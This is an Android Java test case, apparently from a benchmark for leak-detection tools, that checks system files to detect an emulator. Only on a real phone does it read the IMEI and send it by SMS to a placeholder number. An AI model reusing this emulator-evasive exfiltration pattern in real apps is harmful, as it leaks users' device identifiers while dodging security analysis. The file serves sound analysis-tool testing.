package com.example.newedtester;

import java.io.File;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.TextView;

/**
 * @testcase_name EmulatorDetection_File1
 * @version 0.1
 * @author Malviya National Institute of Technology, Jaipur INDIA 
 * @author_mail jyotigajrani@gmail.com
 * 
 * @description This test detects the Android emulator by checking the system
 * files. Some files are specific to emulator while others are to device. This
 * app send IMEI number  via SMS if the app runs on a real phone.
 * @dataflow onCreate: imei -> SMS 
 * @number_of_leaks 1
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		TextView txtStatus;
		

		String status = "Can't Detect";
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		File Ea = new File("/proc/misc");
		File Eb = new File("/proc/ioports");
		File Ec = new File("/sys/devices/virtual/misc/cpu_dma_latency/uevent");
		File Ed = new File("/proc/sys/net/ipv4/tcp_syncookies");

		File Da = new File("/proc/uid_stat");
		File Db = new File("/sys/devices/virtual/ppp");
		File Dc = new File("/sys/devices/virtual/switch");
		File Dd = new File("/sys/module/alarm/parameters");
		File De = new File("/sys/devices/system/cpu/cpu0/cpufreq");
		File Df = new File("/sys/devices/virtual/misc/android_adb");

		if (Ea.exists() && Eb.exists() && Ec.exists() && Ed.exists()) {
			status = "\t File: Emulator";
		} else if (Da.exists() && Db.exists() && Dc.exists() && Dd.exists()
				&& De.exists() && Df.exists()) {
			TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        	String imei = telephonyManager.getDeviceId(); 
        	
			SmsManager sm = SmsManager.getDefault();
	    	String number = "+49 1234";
	    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
			
			status = "\tFile: device";
		}
		 else
	        {
	        	status = "\tFile: Unkown";
	        }


		txtStatus.setText(status);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}